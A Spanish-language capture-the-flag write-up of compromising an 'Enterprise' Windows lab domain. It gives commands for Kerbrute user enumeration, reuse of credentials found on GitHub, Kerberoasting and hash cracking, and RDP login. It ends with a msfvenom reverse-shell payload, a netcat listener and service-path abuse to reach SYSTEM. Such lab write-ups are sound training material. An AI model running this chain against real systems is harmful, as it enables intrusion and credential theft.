Realizamos un escaneo de nmap
![[Pasted image 20240716073204.png]]
![[Pasted image 20240716073230.png]]

Añadimos los nombres que encontramos en el escaneo a `/etc/hosts`
![[Pasted image 20240716085521.png]]

Comenzamos enumerando el puerto 139 y 445 con crackmapexec
![[Pasted image 20240716073419.png]]

Continuamos enumerando el protocolo SMB
![[Pasted image 20240716073726.png]]

Enumeramos los recursos que dispone
![[Pasted image 20240716073904.png]]

Ahora pasamos a enumerar usuarios ya que encontramos el puerto 88 abierto para la autenticación de kerberos, para ello usaremos la herramienta [[Kerbrute]]
```
./kerbrute userenum --dc 10.10.116.29 -d lab.enterprise.thm /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o users.txt
```
![[Pasted image 20240716085225.png]]

Encontramos en el puerto 7990 una web que se ha movido a github
![[Pasted image 20240716074921.png]]

Posteriormente buscamos en githib si encontramos algo de información acerda de la maquina, encontramos un directorio del creador de la maquina en el cual obtenemos unas credenciales
```
https://github.com/Nik-enterprise-dev/mgmtScript.ps1/blob/main/SystemInfo.ps1
```
![[Pasted image 20240716085028.png]]

Las comprobamos con crackmapexec y encontramos que son validas
```
crackmapexec smb lab.enterprise.thm -u 'nik' -p 'ToastyBoi!' --shares
```
![[Pasted image 20240716084925.png]]

Revisamos si podemos acceder con winrm
![[Pasted image 20240716085634.png]]
```
User: nik
Passwd: ToastyBoi!
```

Accedemos por rpcclient
```
rpcclient 10.10.116.29 -U 'nik'
```
![[Pasted image 20240716090026.png]]

Enumeramos los ususarios
![[Pasted image 20240716090121.png|500]]

Enumeramos los grupos
![[Pasted image 20240716090353.png|500]]

Ahora ejecutamos la herramienta `GetUserSPNs.py` y obtenemos el SPNs del usuario bitbucket
```
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -dc-ip 10.10.116.29 -request
```
![[Pasted image 20240716093412.png]]

Copiamos el hash completo y obtenemos las credenciales del usuario bitbucket
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![[Pasted image 20240716093819.png]]
```
User: Bitbucket
Passwd: littleredbucket
```

Ahora utilizaremos xfreerdp para acceder al escritorio remoto
```
xfreerdp /u:Bitbucket /p:littleredbucket /v:lab.enterprise.thm
```
![[Pasted image 20240716094151.png]]
![[Pasted image 20240716094308.png]]

Nos descargamos WinPEAS para encontrar vulnerabilidades
![[Pasted image 20240716095801.png]]

Lo ejecutamos y encontramos un directorio en el cual tenemos permisos de escritura
![[Pasted image 20240716103657.png]]

Lo verificamos y encontramos que tenemos todos los permisos
```
icacls "C:\Program Files (x86)\Zero Tier\Zero Tier One"
```
![[Pasted image 20240716103730.png]]

Ahora generamos un payload con msfvenom para ejecutarlo dentro de la carpeta y obtener permisos `AUTHORITY`
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.166 LPORT=4433 -f exe > Zero.exe
```
![[Pasted image 20240716113714.png]]

Lo transferimos y colocamos en el directorio `C:\Program Files (x86)\Zero Tier\`
![[Pasted image 20240716113828.png]]

Arrancamos el oyente en nuestra maquina para obtener la reverse shell
```
rlwrap nc -nvlp 4433
```
![[Pasted image 20240716114452.png]]

Ahora arrancamos el servicio
```Powershell
Start-Service -Name "zerotieroneservice"
```
![[Pasted image 20240716114520.png]]

Y obtendremos la shell como SYSTEM
![[Pasted image 20240716114551.png]]

Y obtenemos la flag de root
![[Pasted image 20240716114730.png]]